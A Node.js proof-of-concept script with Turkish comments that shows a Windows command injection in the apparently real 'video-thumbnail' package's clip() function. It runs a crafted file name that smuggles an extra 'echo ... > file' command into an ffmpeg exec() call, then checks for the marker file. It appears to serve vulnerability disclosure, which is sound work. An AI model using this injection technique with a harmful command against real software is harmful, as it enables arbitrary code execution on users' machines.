const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

// video-thumbnail paketi index.js clip() fonksiyonundaki kod:
//   var cmd = `ffmpeg -y -i '${input}' -ss ${start} -t ${duration} ...`
//   exec(cmd)
//
// Dosya adi & iceriyorsa Windows'ta command injection olur
// cunku cmd.exe tek tirnaklari ozel karakter olarak yorumlamaz.

const proofFile = path.join(__dirname, 'video-injection-proof.txt');
if (fs.existsSync(proofFile)) fs.unlinkSync(proofFile);

// Simule: video-thumbnail'in clip() fonksiyonunun yaptigi sey
const input = `dummy&echo VIDEO_INJECTION_PROOF > "${proofFile}"&echo .mp4`;
const output = 'output.mp4';

// video-thumbnail'deki tam komut formati
const cmd = `ffmpeg -y -i '${input}' -ss 00:00:01 -t 00:00:03 -r 8 -vf "scale=300:168" -an -c:v libx264 '${output}'`;

console.log('=== video-thumbnail Command Injection PoC ===');
console.log('');
console.log('Orijinal kod (index.js, clip fonksiyonu):');
console.log("  var cmd = `ffmpeg -y -i '${input}' -ss ... -c:v libx264 '${output}'`");
console.log('  exec(cmd)');
console.log('');
console.log('Olusan komut:');
console.log(' ', cmd);
console.log('');
console.log('Windows cmd.exe bunu soyle parse eder:');
console.log("  1. ffmpeg -y -i 'dummy              → ffmpeg basarisiz");
console.log('  2. echo VIDEO_INJECTION_PROOF > ...  → DOSYA YAZILIR');
console.log("  3. echo .mp4' -ss ...                → echo calisir");
console.log('');

exec(cmd, (err, stdout, stderr) => {
    console.log('stdout:', stdout || '(bos)');

    setTimeout(() => {
        if (fs.existsSync(proofFile)) {
            console.log('');
            console.log('!!! COMMAND INJECTION KANITLANDI !!!');
            console.log('Dosya olusturuldu:', proofFile);
            console.log('Icerik:', fs.readFileSync(proofFile, 'utf8').trim());
        } else {
            console.log('Injection calismadi veya dosya olusturulamadi.');
        }
    }, 1000);
});
